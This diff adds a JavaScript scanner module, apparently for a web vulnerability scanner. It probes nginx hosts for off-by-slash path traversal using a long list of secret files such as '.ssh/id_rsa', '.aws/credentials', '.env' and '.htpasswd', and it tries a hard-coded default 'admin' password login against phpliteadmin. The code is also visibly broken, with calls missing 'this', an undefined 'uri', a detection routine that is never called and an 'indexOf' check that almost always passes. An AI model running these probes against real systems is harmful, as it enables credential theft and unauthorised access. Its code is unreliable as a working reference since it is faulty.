@@ -1,0 +1,183 @@
+//const util = require('../utils/utils.js')
+const { CoreLayer, createReport } = require('../core/core.js')
+
+
+const interestingFiles = ["web.config",
+    "build.txt", ".git/index",
+    ".svn/entries",
+    "app/app.js",
+    "js/app.js", "src/app.js",
+    "router.web.js", "tests.js",
+    "node_modules/.bin/mime",
+    ".env", ".env.local", "README.md",
+    "Gemfile", "app.py", "server.py",
+    "config.py",
+    "requirements.txt",
+    "app.js", "index.js",
+    "routes/index.js", "config.js",
+    "package.json", "web.xml", ".s3cfg",
+    "phpunit.xml", "nginx.conf", ".vimrc",
+    "LICENSE.md", "yarn.lock", "Gulpfile",
+    "gulpfile.js", "Gulpfile.js",
+    "composer.json", ".npmignore",
+    "Homestead.yaml", "app.json",
+    "Rakefile", "gruntfile.js",
+    "Gruntfile.js", "Thumbs.db", "Resources.zip.manifest",
+    "main.js", ".ssh/known_hosts",
+    ".env.sample", ".git/config",
+    ".bash_history", ".ssh/id_rsa.pub",
+    "config.lua", "docker-compose.yml",
+    "README.mkd", "version", "license.txt",
+    "README.txt", ".circleci/config.yml",
+    "blog/_wpeprivate/config.json", ".ssh/config"
+    , "config.rb", ".profile", "Vagrantfile",
+    ".mysql_history", "yarn-error.log", "license",
+    ".eslintrc.json", ".hg/requires",
+    "Makefile", "README", ".travis.yml",
+    ".svn/entries", "v2/_catalog",
+    "nginx_app.conf", "Jenkinsfile",
+    "server-status", "Dockerfile",
+    "yarn-debug.log", "config/database.yml",
+    "Gruntfile.js", "config.json", ".bower.json",
+    "VERSION", "readme.mkd", ".htpasswd", "readme",
+    ".gitignore", "mkdocs.yml", "LICENSE", ".editorconfig",
+    "webpack.config.js", ".bowerrc", "pom.xml", ".gitattributes",
+    "readme.txt", ".bashrc", "sftp-config.json",
+    ".hg", "test.php", "license.md", "Procfile",
+    ".git/HEAD", "config/deploy.yml", "appveyor.yml",
+    ".appveyor.yml", ".aws/credentials", "npm-shrinkwrap.json",
+    "manifest.yml", "README.html", "bower.json",
+    "gruntfile.coffee", "readme.md", "karma.conf.js",
+    "LICENSE.txt", "config.ru", "metrics",
+    "rancher-compose.yml", ".jestrc", "tsconfig.json",
+    "_config.yml", ".swp", ".gitmodules",
+    ".subversion/config", "readme.html",
+    "_wpeprivate/config.json", ".rspec",
+    ".babelrc", ".htaccess", "gulpfile.js",
+    "phptest.php", ".dockerignore", "tags",
+    "admin.php", ".ssh/id_rsa",
+    ".ssh/authorized_keys", "php.php",
+    "CVS/Entries", "vendor/autoload.php",
+    "circle.yml", "Gemfile.lock", "build.xml", "composer.lock",
+    "phpinfo.php", "CVS/Root", "Gruntfile.coffee",
+    "aliases", "after.sh", "npm-debug.log",
+    "_cat/indices", "serverless.yml",
+    "Elmah.axd", "RELEASE_NOTES.txt",
+    "env", "test/php/test.php", "test/python/test.py",
+    "test/apacheasp/test.asp", "test/cgi/test.html",
+    "test/fcgi/fcgi.py", "test/fcgi/test.fcgi",
+    "test/ssi/test.shtml", ".yarnrc", "heapdump",
+    "django.log", "api-docs", ".arcrc", ".arcconfig",
+    "api/v1/targets", "api/v1/labels",
+    "api/v1/label/version/values", "config.php.txt",
+    "app-stats", "sqlnet.log",
+    "include.jsp", "index.jsp", "home.jsp",
+    "header.jsp", "footer.jsp",
+    "index.php", "config.php", "header.php",
+    "footer.php", "manage.py", "config.yml",
+    "index.html", "index.htm",
+    ".htaccess", "app.php", "server.php"];
+
+
+class classNginxPathTraversal extends CoreLayer {
+    constructor(coreobj) {
+        super(coreobj);
+        this.Worker = null;
+    }
+
+
+    async testPattern(file, pattern, statusCode) {
+        var uri = file.fullPath;
+        if (uri.endsWith("/")) uri = uri.slice(0, -1);
+
+        this.Worker = new browerHttpJob(this.mainTab)
+
+        this.Worker.url = file.url;
+
+        this.Worker.uri = uri + pattern;
+
+        this.Worker.execute();
+
+        return !this.Worker.err && this.Worker.status == statusCode;
+    }
+
+    async testVuln(file) {
+        var potentialIssue = false;
+
+        // see how the server responds to various payloads
+        if (await this.testPattern(file, ".", 301)) {
+            if (await this.testPattern(file, "..", 301) && await this.testPattern(file, "...", 404)) {
+                potentialIssue = true;
+            }
+        } else {
+            // folder. is equal with folder on nginx off by slash
+            if (this.Worker.err == file.response.err
+                && this.Worker.response.body[0] == file.response.body[0]
+            ) {
+                // make another request to .. (should be different)
+                await testPattern(file, "..", 200);
+                if (this.Worker.response.err != file.response.err
+                    || this.Worker.response.body[0] != file.response.body[0]
+                ) {
+                    potentialIssue = true;
+                }
+
+            }
+        }
+        if (potentialIssue && await confirmIssue(file)) {
+            this.alert(file.fullPath);
+        }
+
+    }
+    async confirmIssue(file) {
+        //trace("LOG: confirmIssue " + file.fullPath);
+
+        for (var i = 0; i < interestingFiles.length; i++) {
+            var filename = interestingFiles[i];
+            //trace("testing " + filename);
+            if (await testPattern(file, "../" + filename, 200)
+                && await testPattern(file, "/" + filename, 404)
+                && await testPattern(file, "../" + filename + randStr(5), 404)
+                && await testPattern(file, "../" + randStr(5) + filename, 404)
+                && await testPattern(file, "./" + filename, 404)
+                && await testPattern(file, "../" + filename, 200)
+            ) {
+                //trace("LOG: !!!! nginx path traversal confirmed with file: " + filename);
+                return true;
+            }
+        }
+        return false;
+    }
+
+
+
+    async startTesting() {
+        //console.log("开始检测nginx敏感目录")
+        this.mainTab = await this.browser.newTab();
+        if (getFilenameFromUrl(this.url) == "phpliteadmin.php")
+            await this.attack(uri);
+        //console.log("结束检测nginx敏感目录")
+        this.mainTab.close();
+    }
+
+    async attack(uri) {
+        const payload = "PHPSESSID=9dc7f1c9a61525a49f80bbb433ba7deb&password=admin&remember=yes&login=Log+In&proc_login=true"
+        const lastJob = new browerHttpJob(this.mainTab)
+        lastJob.url = this.url
+        lastJob.method = this.method
+        lastJob.postData = payload
+        lastJob.isEncodeUrl = false
+        lastJob.addHeader("Content-Type", "application/x-www-form-urlencoded");
+        let response = await lastJob.execute();
+        response.body.forEach(element => {
+            if (element.indexOf("<b>Create New Database</b>")) {
+                console.log(`发现漏洞`);
+                const msg = { url: this.url, body: element, payload: payload, vuln: "rj-027-0001", level: "h" }
+                this.alert(createReport(msg));
+            }
+        });
+    }
+}
+
+
+module.exports = classNginxPathTraversal
